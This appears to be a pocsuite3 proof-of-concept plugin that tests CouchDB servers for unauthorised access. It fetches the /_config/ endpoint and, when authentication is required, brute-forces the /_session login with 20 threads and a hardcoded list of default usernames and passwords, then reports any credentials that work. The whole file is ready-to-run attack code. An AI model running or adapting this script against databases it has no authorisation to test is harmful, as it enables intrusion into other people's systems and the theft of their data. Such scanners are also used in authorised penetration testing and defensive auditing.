# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
from pocsuite3.api import requests
import queue
import itertools

couchdb_username = ['admin','couchdb','couchDB','admin','guest','test']
couchdb_password = ['couchdb','couchDB','123456','admin','admin123','12345','guest','test']


class CouchDBUnauthPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 2, 2020'
    createDate = 'Aug 2, 2020'
    name = 'couchdb未授权访问'
    appName = 'couchdb'
    appVersion = 'v1.0.0'
    vulType = '未授权访问'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 5984
        result = {}
        urls = [f'http://{host}:{port}',f'https://{host}:{port}']
        for url in urls:
            try:
                url = f'http://{host}:{port}'
                res = requests.get(url+'/_config/',timeout=10,verify=False)
                if res.status_code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = f'{host}:{port}/_config/'
                    result['VerifyInfo']['Payload'] = url
                    result['VerifyInfo']['evidence'] = res.text
                    result['extra'] = 'anonymous'
                elif res.status_code == 401:
                    #有密码..需要登录，爆破密码
                    couchDB_burst(url)
                    if not result_queue.empty():
                        username, password = result_queue.get()
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = self.url
                        result['VerifyInfo']['Username'] = username
                        result['VerifyInfo']['Password'] = password
                        result['extra'] = username+':'+password
                break
            except Exception as e:
                logger.info(f'{url}\t{str(e)}')
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

task_queue = queue.Queue()
result_queue = queue.Queue()

def get_word_list():
    return itertools.product(couchdb_username,couchdb_password)

def task_init(url):
    for username, password in get_word_list():
        task_queue.put((url, username.strip(), password.strip()))

def task_thread():
    while not task_queue.empty():
        url, username, password = task_queue.get()
        logger.info('try burst {} use username:{} password:{}'.format(
            url, username, password))
        if couchDB_login(url, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))

def couchDB_login(url,username,password):
    try:
        res = requests.post(url+'/_session',verify=False,data={
            'name':username,
            'password':password
        },timeout=10)
        if res.status_code == 200:
            return True
    except:
        pass
    return False

def couchDB_burst(url):
    try:
        task_init(url)
        run_threads(20,task_thread)
    except:
        pass


register_poc(CouchDBUnauthPOC)